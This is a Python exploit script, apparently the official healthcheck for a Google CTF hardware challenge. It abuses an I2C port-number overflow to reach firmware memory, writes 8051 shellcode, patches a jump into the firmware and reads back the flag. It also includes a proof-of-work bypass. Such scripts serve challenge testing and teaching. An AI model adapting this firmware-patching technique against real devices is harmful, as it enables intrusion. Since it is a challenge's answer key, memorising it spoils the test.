#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Note: This is a full exploit. Just run ./healthcheck.py IP PORT
# If you want to see the flag uncomment line with print(flag) somewhere below.
#

import sys
import pwnlib.tubes

def i2c_read(cmd):
  if type(cmd) is str:
    cmd = cmd.encode()

  r.sendline(b'r ' + cmd)
  status_line = r.recvuntil(b'\n').decode()
  if not status_line.startswith('i2c status: transaction completed'):
    sys.exit(f"Error: Communication failed ('{status_line}')")

  data = r.recvuntil(b'? ').decode()
  data = data.split('\n-end')[0].split()

  return [int(x) for x in data]

def i2c_write(cmd, get_prompt=True):
  if type(cmd) is str:
    cmd = cmd.encode()

  r.sendline(b'w ' + cmd)

  if get_prompt:
    status_line = r.recvuntil(b'\n').decode()
    if not status_line.startswith('i2c status: transaction completed'):
      sys.exit(f"Error: Communication failed ('{status_line}')")

    r.recvuntil(b'? ')

def exploit(r):
  print("Healthcheck start")
  r.newline = b'\n'
  r.recvuntil(b'? ')

  # Trivial check if everything works.
  data = i2c_read('101 5')
  if len(data) != 5:
    sys.exit("Error: Trivial check failed (1)")

  if data != [22, 22, 21, 35, 0]:
    sys.exit("Error: Trivial check failed (2)")

  print("Trivial check passed.")

  # Leak the firmware.
  port_bypass = 101000
  while (port_bypass % 256 != 33):
    port_bypass += 1

  print(f"Using port: {port_bypass}")

  """
  # Dumping the whole firmware is slow and useful only when testing.
  f = open("dumpfirmware", "wb")

  for i in range(0, 32768 // 8, 64):
    page = i // 64
    i2c_write(f'{port_bypass} 1 {page}')
    data = i2c_read(f'{port_bypass} 64')
    bdata = bytearray(data)
    print(page, len(data), bdata)
    f.write(bdata)
    f.flush()
  """

  # Dump the last page and check if it's as expected (should be a series of
  # FFs).
  last_page = (32768 // 8) // 64 - 1
  i2c_write(f'{port_bypass} 1 {last_page}')
  data = i2c_read(f'{port_bypass} 64')
  if any([x != 0xff for x in data]):
    sys.exit("Error: Firmware dump of last page has unexpected data.")

  print("Last page dump check passed.")

  # Test bit clear and re-check last page.
  clear_mask = ' '.join([str(0xa5)] * 64)
  i2c_write(
    f'{port_bypass} {1+4+64} {last_page} '
    f'{0xa5} {0x5a} {0xa5} {0x5a} {clear_mask}')

  data = i2c_read(f'{port_bypass} 64')
  if any([x != 0x5a for x in data]):
    sys.exit("Error: Bit clear test failed.")

  print("Last page bit clear check passed.")

  # Shellcode placed at 0xa80 (since it's pretty easy to jump there).
  shellcode = (  # Output of as31 -Fbyte shellcode.a51
"""
0A80: 00
0A81: 00
0A82: 00
0A83: 00
0A84: 00
0A85: 00
0A86: 00
0A87: 00
0A88: E4
0A89: F8
0A8A: E8
0A8B: F5
0A8C: EE
0A8D: E5
0A8E: EF
0A8F: F5
0A90: F2
0A91: 08
0A92: E8
0A93: F4
0A94: 70
0A95: F4
0A96: F5
0A97: FF
""")
  shellcode_clear_mask = [
     ~int(x.split(": ")[1], 16) & 0xff for x in shellcode.splitlines() if x
  ]
  shellcode_len = len(shellcode_clear_mask)
  shellcode_clear_mask = ' '.join([str(x) for x in shellcode_clear_mask])
  i2c_write(
    f'{port_bypass} {1+4+shellcode_len} {0xa80 // 64} '
    f'{0xa5} {0x5a} {0xa5} {0x5a} {shellcode_clear_mask}')

  # Jump there.
  # This is the 0x124 address (which is 0x24 byte on that 64-byte page).
  # It's in the serial_print function.
  # The clear mask is made for an LJMP 0xA80 (02 0A 80).
  clear_mask = (
    '0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 '                   # 0x100
    '0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 '                   # 0x110
    '0 0 0 '                                             # 0x120
    f'255 {~0x02 & 0xff} {~0x0a & 0xff} {~0x80 & 0xff}'  # 0x123
  )
  clear_mask_len = 0x27

  i2c_write(
    f'{port_bypass} {1+4+clear_mask_len} {0x100 // 64} '
    f'{0xa5} {0x5a} {0xa5} {0x5a} {clear_mask}',
    get_prompt=False
  )

  flag = r.recvuntil(b'}', timeout=3).decode()
  if "CTF{" in flag and "}" in flag:
    print("All good!")
    # print(flag)
    return # All good.

  sys.exit(f"Error: Flag not found in output? '{flag}'")


def handle_pow(r):
  print(r.recvuntil(b'python3 '))
  print(r.recvuntil(b' solve '))
  challenge = r.recvline().decode('ascii').strip()
  p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
  solution = p.readall().strip()
  r.sendline(solution)
  print(r.recvuntil(b'Correct\n'))

ip = '127.0.0.1'
port = 1337
if len(sys.argv) == 3:
  ip = sys.argv[1]
  port = int(sys.argv[2])

r = pwnlib.tubes.remote.remote(ip, port)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
  handle_pow(r)

exploit(r)
sys.exit(0)

